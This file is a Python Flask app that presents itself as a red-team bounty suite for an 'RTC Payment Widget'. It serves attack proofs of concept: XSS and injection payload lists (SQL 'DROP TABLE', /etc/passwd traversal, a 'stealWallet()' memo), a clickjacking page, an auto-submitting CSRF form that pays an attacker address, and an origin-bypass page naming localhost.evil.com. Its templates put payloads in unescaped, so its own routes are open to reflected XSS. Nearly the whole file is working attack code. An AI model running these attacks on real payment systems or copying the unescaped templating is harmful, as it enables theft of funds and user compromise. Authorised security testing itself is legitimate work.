# SPDX-License-Identifier: MIT
# SPDX-License-Identifier: MIT

from flask import Flask, render_template_string, request, jsonify
import sqlite3
import os
import html

DB_PATH = 'rustchain.db'

app = Flask(__name__)

# XSS payload collection for payment widget testing
XSS_PAYLOADS = {
    'basic_script': '<script>alert("XSS")</script>',
    'svg_onload': '<svg onload=alert("XSS")>',
    'img_onerror': '<img src=x onerror=alert("XSS")>',
    'javascript_protocol': 'javascript:alert("XSS")',
    'data_uri': 'data:text/html,<script>alert("XSS")</script>',
    'event_handler': '" onmouseover="alert(\'XSS\')" "',
    'style_expression': 'expression(alert("XSS"))',
    'html_entities': '&lt;script&gt;alert("XSS")&lt;/script&gt;',
    'unicode_encoded': '\\u003cscript\\u003ealert("XSS")\\u003c/script\\u003e',
    'nested_encoding': '%253Cscript%253Ealert(%2522XSS%2522)%253C/script%253E'
}

INJECTION_PAYLOADS = {
    'amount_overflow': '999999999999999999999',
    'negative_amount': '-100',
    'float_precision': '0.123456789012345',
    'null_bytes': 'test\\x00payload',
    'path_traversal': '../../../etc/passwd',
    'sql_injection': "'; DROP TABLE payments; --",
    'address_spoofing': 'RTClegitaddress1234" data-real-address="RTCattacker5678',
    'memo_injection': 'Normal memo<script>stealWallet()</script>'
}

def generate_xss_widget_template(payload_type, payload):
    return f'''
<!DOCTYPE html>
<html>
<head>
    <title>XSS PoC - Payment Widget</title>
    <style>
        .widget {{ border: 1px solid #ccc; padding: 20px; margin: 20px; }}
        .payload-info {{ background: #f0f0f0; padding: 10px; margin-bottom: 20px; }}
    </style>
</head>
<body>
    <div class="payload-info">
        <h3>XSS Payload Type: {payload_type}</h3>
        <code>{html.escape(payload)}</code>
    </div>
    
    <!-- Direct parameter injection -->
    <div class="widget">
        <h4>Amount Field Injection</h4>
        <form action="/payment/widget" method="POST">
            <input type="hidden" name="amount" value="{payload}">
            <input type="hidden" name="recipient" value="RTC1234567890">
            <input type="submit" value="Pay Now">
        </form>
    </div>
    
    <!-- Recipient address injection -->
    <div class="widget">
        <h4>Recipient Address Injection</h4>
        <form action="/payment/widget" method="POST">
            <input type="hidden" name="amount" value="10">
            <input type="hidden" name="recipient" value="{payload}">
            <input type="submit" value="Pay Now">
        </form>
    </div>
    
    <!-- Memo field injection -->
    <div class="widget">
        <h4>Memo Field Injection</h4>
        <form action="/payment/widget" method="POST">
            <input type="hidden" name="amount" value="10">
            <input type="hidden" name="recipient" value="RTC1234567890">
            <input type="hidden" name="memo" value="{payload}">
            <input type="submit" value="Pay Now">
        </form>
    </div>
    
    <!-- Widget configuration injection -->
    <div class="widget">
        <h4>Widget Config Injection</h4>
        <script>
            var widgetConfig = {{
                amount: "{payload}",
                recipient: "RTC1234567890",
                theme: "{payload}",
                callback: "{payload}"
            }};
        </script>
    </div>
    
    <!-- DOM manipulation attempt -->
    <div class="widget">
        <h4>DOM XSS Vector</h4>
        <div id="payment-display"></div>
        <script>
            var userInput = "{payload}";
            document.getElementById('payment-display').innerHTML = 'Amount: ' + userInput;
        </script>
    </div>
</body>
</html>
'''

def generate_clickjacking_template():
    return '''
<!DOCTYPE html>
<html>
<head>
    <title>Clickjacking PoC - Payment Widget</title>
    <style>
        .overlay {{
            position: relative;
            width: 400px;
            height: 300px;
        }}
        .fake-button {{
            position: absolute;
            top: 0;
            left: 0;
            width: 400px;
            height: 300px;
            background: #28a745;
            color: white;
            border: none;
            font-size: 24px;
            cursor: pointer;
            z-index: 1;
        }}
        .hidden-widget {{
            position: absolute;
            top: 50px;
            left: 50px;
            width: 300px;
            height: 200px;
            opacity: 0.1;
            z-index: 2;
        }}
    </style>
</head>
<body>
    <h2>Win $1000! Click the Green Button!</h2>
    <div class="overlay">
        <button class="fake-button">CLAIM PRIZE</button>
        <iframe class="hidden-widget" src="/payment/widget?amount=1000&recipient=RTCattacker123&auto=true"></iframe>
    </div>
    
    <p>The user thinks they're claiming a prize, but they're actually authorizing a payment!</p>
</body>
</html>
'''

def generate_csrf_template():
    return '''
<!DOCTYPE html>
<html>
<head>
    <title>CSRF PoC - Auto Payment</title>
</head>
<body>
    <h2>Loading your content...</h2>
    <img src="cute-cat.jpg" width="1" height="1" style="display:none">
    
    <!-- Auto-submitting form -->
    <form id="csrf-form" action="http://localhost:5000/payment/widget" method="POST" style="display:none">
        <input type="hidden" name="amount" value="50">
        <input type="hidden" name="recipient" value="RTCattacker123456789">
        <input type="hidden" name="memo" value="Surprise payment!">
        <input type="hidden" name="auto_confirm" value="true">
    </form>
    
    <script>
        // Auto-submit after page load
        window.onload = function() {{
            setTimeout(function() {{
                document.getElementById('csrf-form').submit();
            }}, 1000);
        }};
    </script>
    
    <!-- Alternative: Image-based CSRF -->
    <img src="http://localhost:5000/payment/widget?amount=25&recipient=RTCattacker&method=GET" width="1" height="1" style="display:none">
</body>
</html>
'''

@app.route('/xss-poc')
def xss_poc_dashboard():
    template = '''
<!DOCTYPE html>
<html>
<head>
    <title>Payment Widget XSS PoC Dashboard</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; }
        .poc-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 20px; }
        .poc-card { border: 1px solid #ddd; padding: 15px; border-radius: 5px; }
        .poc-card h3 { margin-top: 0; color: #d32f2f; }
        .payload-link { display: block; margin: 5px 0; padding: 5px; background: #f5f5f5; text-decoration: none; }
        .payload-link:hover { background: #e0e0e0; }
    </style>
</head>
<body>
    <h1>🔴 Payment Widget XSS & Injection PoCs</h1>
    <p>Red Team bounty testing suite for RTC Payment Widget vulnerabilities</p>
    
    <div class="poc-grid">
        <div class="poc-card">
            <h3>XSS Payloads</h3>
            {% for payload_type in xss_payloads %}
            <a class="payload-link" href="/xss-poc/{{payload_type}}" target="_blank">{{payload_type}}</a>
            {% endfor %}
        </div>
        
        <div class="poc-card">
            <h3>Injection Attacks</h3>
            {% for injection_type in injection_payloads %}
            <a class="payload-link" href="/injection-poc/{{injection_type}}" target="_blank">{{injection_type}}</a>
            {% endfor %}
        </div>
        
        <div class="poc-card">
            <h3>Advanced Attacks</h3>
            <a class="payload-link" href="/clickjacking-poc" target="_blank">Clickjacking</a>
            <a class="payload-link" href="/csrf-poc" target="_blank">CSRF Auto-Payment</a>
            <a class="payload-link" href="/origin-bypass-poc" target="_blank">Origin Validation Bypass</a>
        </div>
        
        <div class="poc-card">
            <h3>Payload Generator</h3>
            <form action="/generate-custom-poc" method="POST" target="_blank">
                <input type="text" name="custom_payload" placeholder="Custom payload" style="width: 100%; margin-bottom: 10px;">
                <select name="vector" style="width: 100%; margin-bottom: 10px;">
                    <option value="amount">Amount Field</option>
                    <option value="recipient">Recipient Address</option>
                    <option value="memo">Memo Field</option>
                    <option value="config">Widget Config</option>
                </select>
                <input type="submit" value="Generate PoC" style="width: 100%;">
            </form>
        </div>
    </div>
</body>
</html>
'''
    return render_template_string(template, 
                                xss_payloads=XSS_PAYLOADS.keys(),
                                injection_payloads=INJECTION_PAYLOADS.keys())

@app.route('/xss-poc/<payload_type>')
def xss_poc_by_type(payload_type):
    if payload_type in XSS_PAYLOADS:
        payload = XSS_PAYLOADS[payload_type]
        return generate_xss_widget_template(payload_type, payload)
    return "Payload not found", 404

@app.route('/injection-poc/<injection_type>')
def injection_poc_by_type(injection_type):
    if injection_type in INJECTION_PAYLOADS:
        payload = INJECTION_PAYLOADS[injection_type]
        return generate_xss_widget_template(injection_type, payload)
    return "Injection type not found", 404

@app.route('/clickjacking-poc')
def clickjacking_poc():
    return generate_clickjacking_template()

@app.route('/csrf-poc')
def csrf_poc():
    return generate_csrf_template()

@app.route('/origin-bypass-poc')
def origin_bypass_poc():
    template = '''
<!DOCTYPE html>
<html>
<head>
    <title>Origin Validation Bypass PoC</title>
</head>
<body>
    <h2>Origin Validation Bypass Test</h2>
    
    <!-- Null origin -->
    <iframe src="data:text/html,<script>
        fetch('http://localhost:5000/payment/widget', {
            method: 'POST',
            body: new FormData(Object.assign(document.createElement('form'), {
                innerHTML: '<input name=amount value=100><input name=recipient value=RTCattacker>'
            }))
        });
    </script>"></iframe>
    
    <!-- Subdomain bypass attempts -->
    <script>
        var origins = [
            'http://localhost.evil.com:5000',
            'http://evil-localhost:5000', 
            'http://127.0.0.1:5000',
            'http://0.0.0.0:5000',
            'http://[::1]:5000'
        ];
        
        origins.forEach(function(origin) {
            var img = new Image();
            img.src = origin + '/payment/widget?amount=10&recipient=RTCtest';
        });
    </script>
</body>
</html>
'''
    return template

@app.route('/generate-custom-poc', methods=['POST'])
def generate_custom_poc():
    payload = request.form.get('custom_payload', '')
    vector = request.form.get('vector', 'amount')
    
    return generate_xss_widget_template(f'custom_{vector}', payload)

@app.route('/payload-tester')
def payload_tester():
    template = '''
<!DOCTYPE html>
<html>
<head>
    <title>Interactive Payload Tester</title>
    <style>
        .tester { max-width: 800px; margin: 20px auto; padding: 20px; }
        .payload-input { width: 100%; height: 100px; margin: 10px 0; }
        .test-results { background: #f0f0f0; padding: 15px; margin: 15px 0; }
    </style>
</head>
<body>
    <div class="tester">
        <h1>Payment Widget Payload Tester</h1>
        <form id="payload-form">
            <label>Test Payload:</label>
            <textarea class="payload-input" id="payload" placeholder="Enter your payload here..."></textarea>
            
            <label>Target Vector:</label>
            <select id="vector">
                <option value="amount">Amount Parameter</option>
                <option value="recipient">Recipient Address</option>
                <option value="memo">Memo Field</option>
                <option value="callback">Callback URL</option>
            </select>
            
            <button type="button" onclick="testPayload()">Test Payload</button>
        </form>
        
        <div id="results" class="test-results" style="display:none;">
            <h3>Test Results:</h3>
            <div id="result-content"></div>
        </div>
        
        <div id="widget-test-area"></div>
    </div>
    
    <script>
        function testPayload() {
            var payload = document.getElementById('payload').value;
            var vector = document.getElementById('vector').value;
            var testArea = document.getElementById('widget-test-area');
            var results = document.getElementById('results');
            var resultContent = document.getElementById('result-content');
            
            // Create test widget with payload
            var widgetHtml = generateWidgetWithPayload(payload, vector);
            testArea.innerHTML = widgetHtml;
            
            // Show results
            results.style.display = 'block';
            resultContent.innerHTML = 'Payload injected into ' + vector + ' parameter<br>' +
                                    'Check console for XSS execution<br>' +
                                    'HTML: <code>' + payload.replace(/</g, '&lt;') + '</code>';
        }
        
        function generateWidgetWithPayload(payload, vector) {
            var baseWidget = '<div style="border:1px solid #ccc; padding:20px; margin:20px;">';
            
            switch(vector) {
                case 'amount':
                    return baseWidget + '<form><input type="hidden" name="amount" value="' + payload + '">Amount: ' + payload + '</form></div>';
                case 'recipient':
                    return baseWidget + '<div>Pay to: ' + payload + '</div></div>';
                case 'memo':
                    return baseWidget + '<div>Memo: ' + payload + '</div></div>';
                case 'callback':
                    return baseWidget + '<script>var callback = "' + payload + '";</script><div>Callback configured</div></div>';
                default:
                    return baseWidget + '<div>Test: ' + payload + '</div></div>';
            }
        }
        
        // Pre-load some interesting payloads for quick testing
        var quickPayloads = [
            '<script>alert("XSS in payment widget")</script>',
            '"><script>alert("Attribute escape")</script>',
            'javascript:alert("Protocol handler")',
            '<img src=x onerror=alert("Image XSS")>',
            '<svg onload=alert("SVG XSS")>'
        ];
        
        function loadQuickPayload(index) {
            document.getElementById('payload').value = quickPayloads[index];
        }
    </script>
</body>
</html>
'''
    return template

if __name__ == '__main__':
    app.run(debug=os.environ.get('FLASK_DEBUG') == '1', port=5001)